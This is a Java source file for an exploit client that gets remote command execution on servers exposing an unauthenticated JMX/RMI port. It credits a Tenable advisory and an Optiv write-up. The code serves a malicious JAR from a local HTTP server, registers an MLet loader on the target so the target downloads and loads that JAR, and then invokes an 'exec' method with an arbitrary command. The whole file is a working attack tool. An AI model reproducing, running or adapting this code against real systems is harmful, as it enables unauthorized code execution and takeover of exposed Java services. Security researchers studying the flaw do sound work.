package jmx_rmi_client;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.UnknownHostException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.ReflectionException;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

// https://www.tenable.com/security/research/tra-2018-28

// Some code has been taken from https://www.optiv.com/blog/exploiting-jmx-rmi
// Thanks to Optiv for a great write up

public class Client {
	private static String JARNAME = "ExecCommand.jar";
	private static String CLASSNAME = "mbean.cmd.ExecCommand";

	private static InetAddress listen_addr;
	private static int listen_port = 1337;
	
	private static void printUsage() {
		String usageText = "Usage: \n" +
				"java -jar <RunExploit.jar> <Local IP> <Target IP> <Target JMX Port> <Command>";
		System.out.println(usageText);
	}
	
	public static void main(String[] args) {
		
		if (args.length < 4) {
			System.err.println("Too few arguments.");
			printUsage();
			System.exit(1);
		}
		
		try {
			listen_addr = InetAddress.getByName(args[0]);	// pass as IP
		} catch (UnknownHostException e) {
			System.err.println("Could not get host IP.");
			e.printStackTrace();
			System.exit(1);
		}

		String host = args[1];
		String port = args[2];
		String command = args[3];
		
		// validate args
		try {
			InetAddress.getByName(host);
			Integer.parseInt(port);
		} catch (UnknownHostException e) {
			System.err.println("Invalid IP address.");
			System.exit(1);
		} catch (NumberFormatException e) {
			System.err.println("Invalid port.");
			System.exit(1);
		}

		// Ensure JAR dependency is in current dir
		String currentDir = System.getProperty("user.dir");
		File jar_file = new File (currentDir + "/" + JARNAME);
		
		if (!jar_file.exists()) {
			System.err.println(JARNAME + " not found in current directory.");
			System.exit(1);
		}

		try {
			HttpServer server = HttpServer.create(new InetSocketAddress(listen_addr, listen_port), 0);
			server.createContext("/"+JARNAME, new JarDownloadHandler());
			server.setExecutor(null); // creates a default executor

			System.out.println("\nHTTP Server started...");
			server.start();

			MBeanServerConnection conn = connectToJmx(host, port);			
			runExploit(conn, command);

			server.stop(0);
			System.out.println("HTTP Server stopped...");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	static MBeanServerConnection connectToJmx(String jmxServerIp, String port) {
			MBeanServerConnection mbean_conn = null;
			try {
				JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + jmxServerIp + ":" + port +  "/jmxrmi");
				System.out.println("Connecting to '" + url + "'...");
				JMXConnector c = JMXConnectorFactory.connect(url);
				mbean_conn = c.getMBeanServerConnection();
			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			return mbean_conn;
	}

	static void runExploit(MBeanServerConnection mbean_conn, String command) {
		try {
			String name = "Exploit";
			String loaderStr = "loaders:name=" + name;
			ObjectName loader = new ObjectName(loaderStr);
			
			// Ensure loader MBean is created/instantiated
			try {
				System.out.println("Creating MBean '" + loader + "'");
				mbean_conn.createMBean("javax.management.loading.MLet",  loader);
			} catch (javax.management.InstanceAlreadyExistsException e) {
				System.out.println("Loading object instance '" + loader + "'");
				mbean_conn.getObjectInstance(loader);
			}

			// Add jar url to the list of URLs to search for classes and resources.
			// See https://docs.oracle.com/javase/7/docs/api/javax/management/loading/MLet.html
			String http_base_url = "http://" + listen_addr.getHostAddress() + ":" + listen_port;
			String jar_url = http_base_url + "/" + JARNAME;
			System.out.println("Adding URL '" + jar_url + "'");
			mbean_conn.invoke(
				loader,
				"addURL",
				new Object[] { jar_url },
				new String[] { String.class.getName() }
			);
			
			// Instantiate our class the runs commands
			ObjectInstance hello = null;
			ObjectName server = new ObjectName("resources.http:type=" + name + ",url=" + listen_addr.getHostAddress());
			try {
				System.out.println("Creating MBean '" + CLASSNAME + "'");
				hello = mbean_conn.createMBean(
					CLASSNAME,
					server,
					loader,
					new Object[] { http_base_url },
					new String[] { String.class.getName() }
				);
			} catch (javax.management.InstanceAlreadyExistsException e) {
				System.out.println("Loading object instance '" + CLASSNAME + "'");
				hello = mbean_conn.getObjectInstance(server);
			} catch (ReflectionException e) {
				System.out.println("Could not instantiate '" + CLASSNAME + "'");
				System.exit(1);
			}

			System.out.println("Instantiated " + hello.getClassName() + " object " + hello.getObjectName());
			System.out.println("\nExecuting command: '" + command + "'");
			Object result = mbean_conn.invoke(
				hello.getObjectName(),
				"exec",
				new String[] { command },
				new String[] { String.class.getName() }
			);
			System.out.println("Result: " + result);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	static class JarDownloadHandler implements HttpHandler {
		public void handle(HttpExchange exchange) throws IOException {
			System.out.println("Request made for JAR...");
			
			// Ensure JAR exists in current directory
			String currentDir = System.getProperty("user.dir");
			File file = new File (currentDir + "/" + JARNAME);
			byte [] jar_bytes  = new byte [(int)file.length()];
			
			if (!file.exists()) {
				System.err.println(JARNAME + " not found in current directory.");
				System.exit(1);
			}
			
			// read JAR
			FileInputStream fis = new FileInputStream(file);
			BufferedInputStream bis = new BufferedInputStream(fis);
			bis.read(jar_bytes, 0, jar_bytes.length);
			bis.close();
			
			// Send the HTTP response
			exchange.sendResponseHeaders(200, file.length());
			OutputStream os = exchange.getResponseBody();
			
			// write JAR
			System.out.println("Writing bytes: " + jar_bytes.length);
			os.write(jar_bytes, 0 , jar_bytes.length);
			os.close();
		}
	}
}